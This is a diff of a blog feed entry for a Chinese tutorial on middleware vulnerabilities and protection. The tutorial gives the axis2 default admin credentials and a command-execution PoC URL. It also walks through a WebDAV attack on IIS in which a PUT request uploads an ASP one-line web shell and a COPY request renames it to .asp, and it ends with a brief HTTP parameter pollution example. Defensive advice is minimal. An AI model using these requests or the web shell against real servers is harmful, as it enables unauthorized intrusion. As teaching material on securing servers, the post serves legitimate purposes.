@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://y-hkl.top/"/>
-  <updated>2017-12-15T06:24:18.626Z</updated>
+  <updated>2017-12-19T09:31:16.662Z</updated>
   <id>http://y-hkl.top/</id>
   
   <author>
@@ -17,10 +17,10 @@
   
   <entry>
     <title>中间件漏洞与防护</title>
-    <link href="http://y-hkl.top/2017/12/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E6%8A%A4%20/"/>
-    <id>http://y-hkl.top/2017/12/15/中间件漏洞与防护 /</id>
+    <link href="http://y-hkl.top/2017/12/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E6%8A%A4/"/>
+    <id>http://y-hkl.top/2017/12/15/中间件漏洞与防护/</id>
     <published>2017-12-15T05:57:05.000Z</published>
-    <updated>2017-12-15T06:24:18.626Z</updated>
+    <updated>2017-12-19T09:31:16.662Z</updated>
     
     <content type="html"><![CDATA[<p>中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的<br><a id="more"></a><br>我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？</p>
 <h2 id="中间件、容器、服务器傻傻分不清？"><a href="#中间件、容器、服务器傻傻分不清？" class="headerlink" title="中间件、容器、服务器傻傻分不清？"></a>中间件、容器、服务器傻傻分不清？</h2><p>在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。因此在书写本篇时，我特意翻查了一些资料，试图梳理清这几者之间的关系，参考了文章：<a href="http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html" target="_blank" rel="external">http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html</a></p>
@@ -53,9 +53,9 @@
 <h2 id="axis2命令执行漏洞详情"><a href="#axis2命令执行漏洞详情" class="headerlink" title="axis2命令执行漏洞详情"></a>axis2命令执行漏洞详情</h2><p>默认后台地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/axis2-admin/</div></pre></td></tr></table></figure></p>
 <p>默认账号密码：admin与axis2<br>登录后效果如下：<br><img src="/upload_img/中间件_3.png" alt=""><br>执行系统命令poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/services/Axis2Shell/execCmd?cmd=whoami</div></pre></td></tr></table></figure></p>
 <h2 id="IIS漏洞与防护"><a href="#IIS漏洞与防护" class="headerlink" title="IIS漏洞与防护"></a>IIS漏洞与防护</h2><p>IIS是微软的一款web服务器，其配置不当容易产生webdav漏洞。webdav本身是iis的一项扩展功能，开启后可以使用除了get、post以外的一些请求类型，比如put等。但如果配置不当，就会导致文件上传漏洞。除了webdav漏洞，近期还爆出了一个远程命令执行漏洞，具体移步：IIS6.0远程命令执行漏洞(CVE-2017-7269)</p>
-<h3 id="IIS-Webdav漏洞详情"><a href="#IIS-Webdav漏洞详情" class="headerlink" title="IIS Webdav漏洞详情"></a>IIS Webdav漏洞详情</h3><p>当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">OPTIONS  / HTTP/1.1</div><div class="line">Host:thief.one</div></pre></td></tr></table></figure></p>
-<p>如果存在PUT方法，则可以尝试写入一个txt文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PUT /shell.txt HTTP/1.1</div><div class="line">HOST:thief.one</div><div class="line">Content-length:30</div><div class="line">&lt;%eval request(&quot;nmask&quot;)%&gt;</div></pre></td></tr></table></figure></p>
-<p>若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。<br>通过MOVE或COPY方法改文件后缀名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COPY /shell.txt HTTP/1.1</div><div class="line">HOST:thief.one</div><div class="line">Destination:http://thief.one/shell.asp</div></pre></td></tr></table></figure></p>
+<h3 id="IIS-Webdav漏洞详情"><a href="#IIS-Webdav漏洞详情" class="headerlink" title="IIS Webdav漏洞详情"></a>IIS Webdav漏洞详情</h3><p>当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">OPTIONS  / HTTP/1.1</div><div class="line">Host:baidu.com</div></pre></td></tr></table></figure></p>
+<p>如果存在PUT方法，则可以尝试写入一个txt文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PUT /shell.txt HTTP/1.1</div><div class="line">HOST:baidu.com</div><div class="line">Content-length:30</div><div class="line">&lt;%eval request(&quot;test&quot;)%&gt;</div></pre></td></tr></table></figure></p>
+<p>若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。<br>通过MOVE或COPY方法改文件后缀名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COPY /shell.txt HTTP/1.1</div><div class="line">HOST:xxx.com</div><div class="line">Destination:http://www.xxx.com/shell.asp</div></pre></td></tr></table></figure></p>
 <h3 id="IIS漏洞防护"><a href="#IIS漏洞防护" class="headerlink" title="IIS漏洞防护"></a>IIS漏洞防护</h3><p>关闭webdav功能</p>
 <h2 id="HPP漏洞"><a href="#HPP漏洞" class="headerlink" title="HPP漏洞"></a>HPP漏洞</h2><p>HPP漏洞是web容器处理http参数时的问题，前面几款web服务器都或多或少存在这样的问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $str=$_REQUEST[&apos;str&apos;];                    #$_REQUEST[]函数可以接受GET/POST。</div><div class="line">    Echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
 <p>比如访问URL:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello</div></pre></td></tr></table></figure></p>
